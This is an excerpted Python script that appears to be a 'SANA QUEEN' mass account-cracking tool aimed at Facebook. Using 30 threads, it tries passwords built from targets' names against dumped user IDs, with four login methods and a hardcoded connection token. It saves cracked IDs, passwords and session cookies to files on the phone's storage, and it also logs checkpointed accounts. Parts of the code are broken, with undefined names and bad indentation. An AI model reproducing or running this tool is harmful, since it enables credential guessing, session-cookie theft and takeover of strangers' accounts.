...
from concurrent.futures import ThreadPoolExecutor as sanaqueen
from string import * 
...
sys.stdout.write('\x1b]2; SANA\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back SANA Menu ")
        exit()
...
def Sana():   
    ...
    if select =='1':
        ...
        exit(' THANKS FOR USING QUEEN TOOL  ... ')
    #elif select =='3':
        #random_number()
    #elif select =='4':
       #menu()
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SANA] {loop} | M•1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SANAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SANAb};{ckkk}"
                    print(f'\r\033[10;92m\033[1;91m[\033[1;92mSANA-QUEEN-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mUSER\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[🍪]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                    oks.append(sid)
                    open('/sdcard/QUEEN.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SANA-QUEEN_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     print(f"\r{A} [QUEEN-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/QUEEN.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SANA] {loop} | M•3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);SANAb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={SANAb};{ckkk}"
                    print(f"\r{R} [SANA-QUEEN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SANA-QUEEN.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SANA_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [QUEEN-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[SANA-QIEEN] {loop} | M•2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [SANA-QUEEN-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/SANA-QUEEN.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SANA-QUEEN_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f"\r{A} [SANA-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SANA.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[SANA-QUEEN] {loop} | M•4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with sanaqueen(max_workers=30) as SANAworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                SANAAworld.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                SANAworld.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                SANAworld.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                SANAworld.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/SANA-QUEEN.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/QUEEN.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    SANA = input('Put File Name :')
    print(" ")
    sana = input('Saving Put File Name :')
    os.system('touch ' +SANA-QUEEN)
    os.system('sort -r '+SANA+' | uniq > '+QUEEN)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + SANA )
    print(47*'-')
    print("File Saved To :" + QUEEN )
    print(47*'-')
    input(f"{S} Press Enter To Back SANA Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/QUEEN.txt\n') 
        filepath = input("Put File Name: ")
...
def cutter():
    ...
    print(logo)
    print("Removed Successful From File: " + SANA )
    print("New File Saved:" + SANA-QUEEN )
    print(47*'-')
    input(f"{S} Press Enter To Back SANA Menu ")
    SANA(allkey)       
